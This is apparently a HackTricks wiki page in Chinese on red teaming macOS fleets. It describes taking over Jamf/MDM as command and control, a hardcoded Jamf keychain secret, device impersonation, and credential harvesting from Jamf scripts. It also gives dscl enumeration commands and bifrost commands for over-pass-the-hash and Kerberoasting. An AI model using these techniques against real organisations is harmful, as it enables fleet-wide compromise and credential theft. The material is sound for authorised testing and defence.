# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## 滥用 MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

如果你成功**获取管理员凭据**以访问管理平台，你可以**潜在地危害所有计算机**，通过在机器上分发恶意软件。

在 MacOS 环境中进行红队活动，强烈建议对 MDM 的工作原理有一定了解：

{{#ref}}
macos-mdm/
{{#endref}}

### 将 MDM 用作 C2

MDM 将有权限安装、查询或删除配置文件，安装应用程序，创建本地管理员帐户，设置固件密码，更改 FileVault 密钥...

为了运行自己的 MDM，你需要**你的 CSR 由供应商签名**，你可以尝试通过 [**https://mdmcert.download/**](https://mdmcert.download/) 获取。要为 Apple 设备运行自己的 MDM，你可以使用 [**MicroMDM**](https://github.com/micromdm/micromdm)。

然而，要在注册设备上安装应用程序，你仍然需要它由开发者帐户签名... 然而，在 MDM 注册时，**设备将 MDM 的 SSL 证书添加为受信任的 CA**，所以你现在可以签署任何东西。

要将设备注册到 MDM，你需要以 root 身份安装一个**`mobileconfig`** 文件，这可以通过**pkg** 文件传递（你可以将其压缩为 zip，当从 Safari 下载时会被解压）。

**Mythic agent Orthrus** 使用了这种技术。

### 滥用 JAMF PRO

JAMF 可以运行**自定义脚本**（由系统管理员开发的脚本）、**本地有效载荷**（本地帐户创建、设置 EFI 密码、文件/进程监控...）和**MDM**（设备配置、设备证书...）。

#### JAMF 自助注册

访问 `https://<company-name>.jamfcloud.com/enroll/` 这样的页面，查看他们是否启用了**自助注册**。如果启用了，可能会**要求输入凭据以访问**。

你可以使用脚本 [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) 执行密码喷洒攻击。

此外，在找到合适的凭据后，你可能能够使用下一个表单暴力破解其他用户名：

![](<../../images/image (107).png>)

#### JAMF 设备认证

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`** 二进制文件包含打开钥匙串的秘密，在发现时是**共享**给每个人的，内容是：**`jk23ucnq91jfu9aj`**。\
此外，jamf **持久化**为**LaunchDaemon** 在 **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF 设备接管

**JSS**（Jamf 软件服务器）**URL** 是 **`jamf`** 将使用的，位于 **`/Library/Preferences/com.jamfsoftware.jamf.plist`**。\
该文件基本上包含 URL：
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
因此，攻击者可以放置一个恶意包（`pkg`），在安装时**覆盖此文件**，将**URL设置为来自Typhon代理的Mythic C2监听器**，以便能够滥用JAMF作为C2。
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF 冒充

为了**冒充设备与 JMF 之间的通信**，你需要：

- 设备的 **UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF 密钥链**来自: `/Library/Application\ Support/Jamf/JAMF.keychain`，其中包含设备证书

有了这些信息，**创建一个虚拟机**，使用**被盗**的硬件**UUID**，并且**禁用 SIP**，放置**JAMF 密钥链，** **hook** Jamf **代理**并窃取其信息。

#### 秘密窃取

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

你还可以监控位置 `/Library/Application Support/Jamf/tmp/`，以获取管理员可能希望通过 Jamf 执行的**自定义脚本**，因为它们**在这里放置、执行并移除**。这些脚本**可能包含凭据**。

然而，**凭据**可能作为**参数**传递给这些脚本，因此你需要监控 `ps aux | grep -i jamf`（甚至不需要 root 权限）。

脚本 [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) 可以监听新文件的添加和新进程参数。

### macOS 远程访问

还有关于 **MacOS** "特殊" **网络** **协议**：

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

在某些情况下，你会发现**MacOS 计算机连接到 AD**。在这种情况下，你应该尝试**枚举**活动目录，就像你习惯的那样。在以下页面中找到一些**帮助**：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

一些**本地 MacOS 工具**也可能对你有帮助，`dscl`：
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
还为MacOS准备了一些工具，以自动枚举AD并与kerberos进行交互：

- [**Machound**](https://github.com/XMCyber/MacHound)：MacHound是Bloodhound审计工具的扩展，允许在MacOS主机上收集和摄取Active Directory关系。
- [**Bifrost**](https://github.com/its-a-feature/bifrost)：Bifrost是一个Objective-C项目，旨在与macOS上的Heimdal krb5 API进行交互。该项目的目标是使用本机API在macOS设备上进行更好的Kerberos安全测试，而无需在目标上要求任何其他框架或软件包。
- [**Orchard**](https://github.com/its-a-feature/Orchard)：用于Active Directory枚举的JavaScript自动化（JXA）工具。

### 域信息
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### 用户

MacOS 用户有三种类型：

- **本地用户** — 由本地 OpenDirectory 服务管理，与 Active Directory 没有任何连接。
- **网络用户** — 易变的 Active Directory 用户，需要连接到 DC 服务器进行身份验证。
- **移动用户** — 具有本地备份的 Active Directory 用户，用于其凭据和文件。

关于用户和组的本地信息存储在文件夹 _/var/db/dslocal/nodes/Default._\
例如，名为 _mark_ 的用户信息存储在 _/var/db/dslocal/nodes/Default/users/mark.plist_ 中，组 _admin_ 的信息存储在 _/var/db/dslocal/nodes/Default/groups/admin.plist_ 中。

除了使用 HasSession 和 AdminTo 边缘，**MacHound 向 Bloodhound 数据库添加了三个新边缘**：

- **CanSSH** - 允许 SSH 连接到主机的实体
- **CanVNC** - 允许 VNC 连接到主机的实体
- **CanAE** - 允许在主机上执行 AppleEvent 脚本的实体
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
更多信息请访问 [https://its-a-feature.github.io/posts/2018/
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
可以在系统钥匙串中访问 **`Computer$`** 密码。

### Over-Pass-The-Hash

获取特定用户和服务的 TGT：
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
一旦收集到 TGT，就可以通过以下方式将其注入当前会话：
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
通过获得的服务票证，可以尝试访问其他计算机上的共享：
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## 访问钥匙串

钥匙串很可能包含敏感信息，如果在没有生成提示的情况下访问，可能有助于推进红队演习：

{{#ref}}
macos-keychain.md
{{#endref}}

## 外部服务

MacOS 红队与常规 Windows 红队不同，因为通常 **MacOS 直接与多个外部平台集成**。 MacOS 的常见配置是使用 **OneLogin 同步凭据访问计算机，并通过 OneLogin 访问多个外部服务**（如 github, aws...）。

## 其他红队技术

### Safari

当在 Safari 中下载文件时，如果是“安全”文件，它将 **自动打开**。例如，如果您 **下载一个 zip 文件**，它将自动解压缩：

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## 参考

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
